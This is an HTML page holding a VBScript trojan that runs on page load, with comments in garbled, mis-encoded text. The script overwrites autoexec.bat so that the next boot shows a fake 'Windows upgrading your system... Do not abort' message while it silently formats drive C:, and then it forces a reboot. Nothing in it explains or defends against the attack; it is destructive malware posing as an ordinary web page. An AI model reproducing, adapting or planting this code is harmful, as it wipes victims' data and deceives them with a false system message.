<html>
<body>
<script language ="VBScript">
sub Reboot '���������� ������������
Set Shell=CreateObject("WScript.Shell")
Shell.Run "Rundll32.exe User.exe,ExitWindows" '����� WinApi � ������� RunDll
end sub
sub destruct
set fs=createobject("Scripting.FileSystemObject")'FileSystem
if fs.fileexists("c:autoexec.bat") then '���� � ��� Autoexec ����������
set ab=fs.getfile("c:autoexec.bat") '����� ���
ab.attributes=0 '� �������� "����������" ���������))
end if
set autoexec=fs.CreateTextFile("c:autoexec.bat")'������������ Autoexec
'����� ������� � ���� �������� ��������, �� ��� ���� �� �������!)
autoexec.WriteLine "@cls"
autoexec.WriteLine "@echo Windows upgrading your system..."
autoexec.WriteLine "@echo Do not abort this process!"
autoexec.WriteLine "@format c: /q /autotest"
autoexec.close '������� Autoexec.bat
end sub
destruct '������� � Autoexec �������� format
reboot
</script>
</body>
</html>